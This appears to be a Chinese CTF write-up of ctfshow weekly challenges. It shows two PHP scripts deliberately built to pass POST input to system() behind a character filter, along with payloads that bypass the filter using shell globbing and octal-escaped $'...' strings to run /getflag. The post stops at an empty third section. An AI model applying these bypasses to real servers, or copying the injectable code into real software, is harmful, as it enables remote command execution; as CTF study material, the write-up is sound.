---
title: 复现 ctfshow 每周大挑战
date: 2025-09-02 21:27:46
updated: 2025-09-02 21:27:46
author: Xebdria
categories:
  - wp
---

{% raw %}
## 一

```php
<?php
//本题灵感来自研究一直没做出来的某赛某题时想到的姿势，太棒啦~。
//flag在根目录flag里，或者直接运行根目录getflag

error_reporting(0);
highlight_file(__FILE__);

if (isset($_POST['ctf_show'])) {
    $ctfshow = $_POST['ctf_show'];
    if (!preg_match("/[b-zA-Z_@#%^&*:{}\-\+<>\"|`;\[\]]/",$ctfshow)){
            system($ctfshow);
        }else{
            echo("????????");
        }
}
?>
```

可用的有! $ ' ( ) , . / 0 1 2 3 4 5 6 7 8 9 = ? \ a ~看到提示直接就是ctf_show=/?????a?

## 二

```php
<?php
//本题灵感来自研究一直没做出来的某赛某题时想到的姿势，太棒啦~。
//flag在根目录flag里，或者直接运行根目录getflag

error_reporting(0);
highlight_file(__FILE__);
include "check.php";

if (isset($_POST['ctf_show'])) {
    $ctfshow = $_POST['ctf_show'];
    check($ctfshow);
    system($ctfshow);
}
?>
```

测试了一下应该是a和?都被ban了，数字还在我们自然而然可以想到用编码绕过我们可以通过`$'\xxx'`的方式执行命令，类似于这样子

![](http://xendria.icu/wp-content/uploads/2025/08/9b364cb2-539c-4836-bb2b-6953639878a7-1024x396.png)

那我们构造/getflag就很容易了ctf_show=$'\57\147\145\164\146\154\141\147'

## 三
{% endraw %}
